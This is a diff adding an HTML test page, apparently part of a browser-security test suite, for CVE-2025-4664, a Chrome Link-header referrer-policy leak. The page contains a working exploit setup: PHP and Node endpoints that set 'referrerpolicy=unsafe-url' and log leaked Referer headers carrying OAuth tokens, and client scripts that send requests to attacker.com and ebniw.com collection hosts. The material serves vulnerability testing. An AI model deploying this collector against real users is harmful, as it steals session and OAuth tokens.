@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>UXSS-CHROME-02: Link Header Referrer Policy Cross-Origin Data Leak</title>
+    <link rel="stylesheet" href="../../../css/style.css">
+</head>
+<body class="test-page" style="background:#0d1117;color:#c9d1d9;">
+<div class="container">
+    <a href="../../../index.html" class="btn btn-back">&larr; Back to Suite</a>
+    <h1>Link Header Referrer Policy Cross-Origin Data Leak</h1>
+    <div class="meta">
+        <span>ID: UXSS-CHROME-02</span>
+        <span>CVE: CVE-2025-4664</span>
+        <span>Browsers: Chrome (pre-136.0.7103.113), Chromium-based</span>
+        <span>Category: Cross-Origin Data Leak</span>
+    </div>
+
+    <div class="test-section">
+        <h2>Description</h2>
+        <p>Chrome uniquely processes <code>Link</code> HTTP headers on sub-resource requests,
+        unlike other browsers which ignore them. By setting <code>referrer-policy=unsafe-url</code>
+        in a Link header, an attacker can force Chrome to include full query parameters
+        (including OAuth tokens, session IDs) in the Referer header when fetching sub-resources
+        from an attacker-controlled domain.</p>
+        <p><strong>This was actively exploited in the wild</strong> and added to CISA KEV catalog.
+        Discovered by Vsevolod Kokorin (@slonser_) in May 2025.</p>
+    </div>
+
+    <div class="test-section">
+        <h2>Technique</h2>
+        <div class="code-block">// Attack requires server-side component on attacker domain to set:
+// Link: &lt;https://attacker.com/collect&gt;; rel=preload; as=image; referrerpolicy=unsafe-url
+//
+// Client-side detection test:
+// 1. Load a page with sensitive query params (simulating OAuth callback)
+// 2. Include an image from attacker domain
+// 3. Check if the attacker's server receives full referrer with query params
+//
+// Server response header on attacker-controlled resource:
+// Link: &lt;/collect.gif&gt;; rel=preload; as=image; referrerpolicy=unsafe-url
+//
+// The browser then sends a preload request with:
+// Referer: https://victim.com/callback?token=SECRET_TOKEN
+
+// Client-side test: Check if Link header referrer-policy override works
+const img = new Image();
+img.src = 'https://ebniw.com/collect?t=' + Date.now();
+// If vulnerable, the request Referer will contain full URL including ?secret=xxx</div>
+    </div>
+
+    <div class="test-section">
+        <h2>Run Test</h2>
+        <p style="color:#d29922;font-size:0.85em;">Note: Full exploitation requires a server-side
+        component on ebniw.com that returns Link headers. This client-side test checks
+        browser behavior with referrer policies on sub-resources.</p>
+        <button class="btn btn-run" onclick="runTest()">Execute Client-Side Test</button>
+        <button class="btn" onclick="runServerTest()">Test with Server Endpoint (requires setup)</button>
+        <div id="output" class="output-box" style="margin-top:10px;"></div>
+    </div>
+
+    <div class="test-section">
+        <h2>Server-Side Setup Required (ebniw.com)</h2>
+        <div class="code-block">## PHP endpoint: /collect.php on ebniw.com
+&lt;?php
+header('Link: &lt;/pixel.gif&gt;; rel=preload; as=image; referrerpolicy=unsafe-url');
+header('Content-Type: image/gif');
+header('Access-Control-Allow-Origin: *');
+// Log the Referer header
+$ref = $_SERVER['HTTP_REFERER'] ?? 'none';
+file_put_contents('/tmp/referer-log.txt', date('c').' '.$ref."\n", FILE_APPEND);
+// Return 1x1 transparent GIF
+echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
+?&gt;
+
+## Node.js equivalent:
+app.get('/collect', (req, res) => {
+    res.set('Link', '&lt;/pixel.gif&gt;; rel=preload; as=image; referrerpolicy=unsafe-url');
+    res.set('Access-Control-Allow-Origin', '*');
+    console.log('Referer:', req.headers.referer);
+    // serve 1x1 gif
+});</div>
+    </div>
+</div>
+
+<script src="../../../js/utils.js"></script>
+<script>
+function runTest() {
+    const output = document.getElementById('output');
+    const info = detectBrowser();
+    output.innerHTML = '<div style="color:#d29922;">Running client-side referrer policy test...</div>';
+    output.innerHTML += '<div style="color:#8b949e;">Browser: ' + info.browser + ' ' + info.version + '</div>';
+
+    // Simulate a page with sensitive query params
+    const sensitiveParam = 'secret_token=TESTVALUE_' + Math.random().toString(36).substr(2);
+    output.innerHTML += '<div style="color:#8b949e;">Current URL params being tested: ' + sensitiveParam + '</div>';
+
+    // Test 1: Check if referrerPolicy on an image element works
+    const img1 = new Image();
+    img1.referrerPolicy = 'unsafe-url';
+    img1.onload = function() {
+        output.innerHTML += '<div style="color:#58a6ff;">Image loaded (referrerPolicy=unsafe-url set on element)</div>';
+    };
+    img1.onerror = function() {
+        output.innerHTML += '<div style="color:#8b949e;">Image failed to load (server may not be set up)</div>';
+    };
+    img1.src = CONFIG.XORIGIN_ORIGIN + '/collect?test=referrer-element&t=' + Date.now();
+
+    // Test 2: Check if <link> preload respects referrer-policy
+    const link = document.createElement('link');
+    link.rel = 'preload';
+    link.as = 'image';
+    link.href = CONFIG.XORIGIN_ORIGIN + '/collect?test=link-preload&t=' + Date.now();
+    link.referrerPolicy = 'unsafe-url';
+    document.head.appendChild(link);
+
+    output.innerHTML += '<div style="color:#58a6ff;">Preload link injected with referrerpolicy=unsafe-url</div>';
+
+    // Test 3: Check browser's default referrer policy
+    output.innerHTML += '<div style="color:#8b949e;">Document referrer policy: ' + (document.referrer || 'none') + '</div>';
+
+    // Check if Navigation API supports referrer policy
+    if (info.engine === 'Blink') {
+        output.innerHTML += '<div style="color:#d29922;">Blink engine detected. Chrome-specific Link header handling may be active.</div>';
+        output.innerHTML += '<div style="color:#d29922;">To fully verify: set up server on ' + CONFIG.XORIGIN_DOMAIN + ' returning Link headers and check referer logs.</div>';
+        reportResult('output', 'CVE-2025-4664 Link Header Referrer Leak', false,
+            'Client-side test only. Requires server-side verification. Chrome <136.0.7103.113 is vulnerable.');
+    } else {
+        reportResult('output', 'CVE-2025-4664 Link Header Referrer Leak', false,
+            'Non-Blink browsers ignore Link headers on sub-resources. Not affected by this specific CVE.');
+    }
+}
+
+function runServerTest() {
+    const output = document.getElementById('output');
+    output.innerHTML = '<div style="color:#d29922;">Testing with server endpoint on ' + CONFIG.XORIGIN_DOMAIN + '...</div>';
+    output.innerHTML += '<div style="color:#8b949e;">Ensure the PHP/Node endpoint is set up on ' + CONFIG.XORIGIN_DOMAIN + '/collect</div>';
+
+    // Navigate this page to include a fake token param
+    const testUrl = window.location.href.split('?')[0] + '?oauth_token=TEST_LEAKED_VALUE_' + Date.now();
+    output.innerHTML += '<div>Reloading with sensitive param... check server logs on ' + CONFIG.XORIGIN_DOMAIN + '</div>';
+
+    // Add the image that will cause the leak
+    const img = new Image();
+    img.src = CONFIG.XORIGIN_ORIGIN + '/collect?verify=1&t=' + Date.now();
+    img.onload = function() {
+        output.innerHTML += '<div style="color:#3fb950;">Server responded. Check referer log on ' + CONFIG.XORIGIN_DOMAIN + ' for leaked params.</div>';
+    };
+    img.onerror = function() {
+        output.innerHTML += '<div style="color:#f85149;">Server not responding. Ensure endpoint is configured.</div>';
+    };
+}
+</script>
+</body>
+</html>
